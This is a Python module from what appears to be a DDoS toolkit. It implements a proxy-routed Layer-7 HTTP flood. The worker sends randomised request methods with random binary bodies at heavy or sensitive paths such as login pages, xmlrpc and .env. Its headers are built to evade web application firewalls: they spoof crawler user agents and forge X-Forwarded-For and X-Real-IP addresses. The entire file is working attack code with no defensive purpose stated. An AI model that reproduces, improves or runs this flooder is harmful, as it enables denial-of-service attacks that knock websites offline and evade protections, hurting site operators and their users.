# language: Python 3.10+, file: Module/http_flood.py
# *Layer-7 HTTP flood -- aiohttp + proxy-routed + WAF evasion headers*
# entry: http_worker(url, host, proxy, rpp, tout, mpool)

import asyncio, random, os
from Module.state  import stats, slock, stop
from Module.proxy  import make_connector

# ── request randomisation pools ───────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.7.1", "python-requests/2.32.0", "okhttp/4.12.0",
    "Go-http-client/2.0", "Wget/1.21.4",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

ACCEPT_LANGS    = ["en-US,en;q=0.9", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
                   "fr-FR,fr;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
                   "es-ES,es;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
                   "pt-BR,pt;q=0.9,en;q=0.8,pt-PT;q=0.7"]
CACHE_CONTROLS  = ["no-cache", "max-age=0", "no-store", "must-revalidate"]
REFERERS        = ["https://www.google.com/", "https://www.bing.com/",
                   "https://duckduckgo.com/", "https://t.co/",
                   "https://www.reddit.com/", None, None, None]
HTTP_METHODS    = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "PATCH", "DELETE"]
PATHS           = [
    "/", "/index.php", "/login", "/api/v1/status", "/wp-login.php",
    "/admin", "/.env", "/search?q=" + "X" * 256, "/config", "/upload",
    "/api/users", "/api/products", "/checkout", "/cart", "/account",
    "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/api/v2/",
    "/?s=" + "A" * 128, "/sitemap.xml", "/feed/", "/category/uncategorized/",
]

def _make_headers(host: str) -> dict:
    rip  = ".".join(str(random.randint(1, 254)) for _ in range(4))
    rip2 = ".".join(str(random.randint(1, 254)) for _ in range(4))
    h = {
        "User-Agent":       random.choice(USER_AGENTS),
        "Host":             host,
        "Accept":           random.choice(["*/*",
                                           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                           "application/json, text/plain, */*"]),
        "Accept-Language":  random.choice(ACCEPT_LANGS),
        "Accept-Encoding":  random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
        "Cache-Control":    random.choice(CACHE_CONTROLS),
        "X-Forwarded-For":  f"{rip}, {rip2}",
        "X-Real-IP":        rip,
        "X-Originating-IP": rip,
        "Connection":       random.choice(["keep-alive", "close"]),
    }
    ref = random.choice(REFERERS)
    if ref:
        h["Referer"] = ref
    if random.random() < 0.4:
        h["Pragma"] = "no-cache"
    if random.random() < 0.3:
        h["TE"] = "trailers"
    if random.random() < 0.5:
        h["DNT"] = "1"
    if random.random() < 0.3:
        h["Sec-Fetch-Dest"] = random.choice(["document", "empty", "image"])
        h["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
        h["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
    return h

# ── worker ────────────────────────────────────────────────────────────
async def http_worker(url: str, host: str, proxy: dict,
                      rpp: int, tout: float, mpool: list) -> None:
    """
    One async worker: open an aiohttp session through *proxy*, fire *rpp*
    requests with random methods/paths/headers, tally success/fail in stats.
    *conn.closed check in finally prevents ResourceWarning noise.*
    """
    import aiohttp
    conn = None
    try:
        conn = make_connector(proxy)
        tm   = aiohttp.ClientTimeout(total=tout, connect=2.0,
                                     sock_connect=2.0, sock_read=tout)
        async with aiohttp.ClientSession(connector=conn, timeout=tm) as sess:
            for _ in range(rpp):
                if stop[0]:
                    return
                method = random.choice(mpool)
                full   = url.rstrip("/") + random.choice(PATHS)
                body, blen = None, 0
                if method in ("POST", "PUT", "PATCH"):
                    blen = random.randint(512, 8192)
                    body = os.urandom(blen)
                try:
                    async with sess.request(method, full,
                                            headers=_make_headers(host),
                                            data=body,
                                            allow_redirects=False,
                                            ssl=False) as _:
                        pass
                    with slock:
                        stats["sent"]       += 1
                        stats["success"]    += 1
                        stats["bytes_sent"] += blen
                except Exception:
                    with slock:
                        stats["sent"] += 1
                        stats["fail"] += 1
    except Exception:
        with slock:
            stats["dead"] += 1
    finally:
        if conn and not conn.closed:
            await conn.close()
